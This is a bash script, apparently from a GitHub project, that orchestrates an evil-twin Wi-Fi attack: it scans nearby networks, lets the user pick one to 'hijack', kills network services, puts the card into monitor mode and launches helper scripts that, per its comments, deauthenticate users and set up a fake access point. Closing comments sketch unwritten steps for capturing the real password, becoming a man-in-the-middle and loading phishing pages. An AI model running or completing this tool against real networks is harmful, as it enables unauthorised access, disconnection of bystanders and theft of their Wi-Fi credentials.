#!/bin/bash

check_system()
{
    echo "Checking global variables..."
    variable=$(sysctl net.ipv4.ip_forward | awk '{print $3}')

    if [ $variable -eq 1 ]; then
    echo "OK"
    else
    echo "Packet redirecting is disabled, check github README file"
    exit 1
    fi

    echo "Checking network card..."
    if [ $# -eq 0 ]; then
    echo "No network card in argument, check github README file"
    exit 1
    fi
    echo "OK"
    
    echo "Checking root privilages..."
    if [ "$EUID" -ne 0 ]
    then echo "No root privilages, check github README file"
    exit
    fi
    echo "OK"
    check_dependecies
}

check_dependecies()
{
    echo "Checking dependenies..."
    if command -v airmon-ng &> /dev/null; then
    echo "OK"
    else
    echo "airmon-ng not found, check github README file"
    fi
    if command -v airodump-ng &> /dev/null; then
    echo "OK"
    else
    echo "airodump-ng not found, check github README file"
    fi
    if command -v aireplay-ng &> /dev/null; then
    echo "OK"
    else
    echo "aireplay-ng not found, check github README file"
    fi
    if command -v xterm &> /dev/null; then
    echo "OK"
    else
    echo "xterm not found, check github README file"
    fi

    if [ -d "create_ap" ]; then
    echo "OK"
    else
    echo "create_ap is not installed, folder not found, check github README file"
    fi
}

start_hijack()
{
    echo $selected_ssid
    echo $mac_address
    echo $1
    echo $channel
    #start deauth users
    sudo airmon-ng check kill
    sudo airmon-ng start $1
    sleep 2
    sudo xterm -e "./creator.sh $channel $mac_address $1" & sudo xterm -e "./listener.sh $mac_address $1" & 

    sleep 25
    pkill -f "xterm -e ./creator.sh"
    pkill -f "xterm -e ./listener.sh"    
    
    sleep 2
    #enable WiFi connection 
    sudo airmon-ng stop $1
    sudo ifconfig $1 down
    sudo iwconfig $1 mode managed
    sudo ifconfig $1 up
    sudo service NetworkManager restart
    #make your fake AP listening for correct password


    #use captured password to establish real connection and became MITM


    #load phishing elements
}

start()
{
    echo ""
    echo "Scanning..."
    echo ""
    wifi_list=$(sudo iwlist $1 scan | grep -E "Cell|Channel|Address|ESSID")

    echo "Devices detected around you (for more check README file):"
    echo "$wifi_list"
    echo ""
    echo "Select number of device to hijack:"
    read selected_device

    if [[ $selected_device =~ ^[0-9]+$ ]]; then
    selected_ssid=$(echo "$wifi_list" | awk -v n=$selected_device '/ESSID/{if (++c == n) {gsub(/"/, "", $0); print $0}}')
    mac_address=$(echo "$wifi_list" | awk -v n=$selected_device '/Address/{if (++c == n) {print $5}}')
    channel=$(echo "$wifi_list" | awk -v n=$selected_device '/Frequency/{if (++c == n) {print $NF}}' | sed 's/(Channel //;s/)//')
    channel=$(echo $channel | sed 's/Channel://' | tr -d ')')
    echo "Your choice: $selected_ssid"
    echo "MAC: $mac_address" 
    echo "Channel: $channel"
    else
    echo "Invalid device"
    exit 1
    fi

    sleep 2
    clear
    echo ""
    echo "Starting hijacking process, your internet connection will be lost and terminals will appear, do not press anything from now..."
    sleep 5

    start_hijack $1 "$selected_ssid" "$mac_address" "$channel"
}

check_system $1
start $1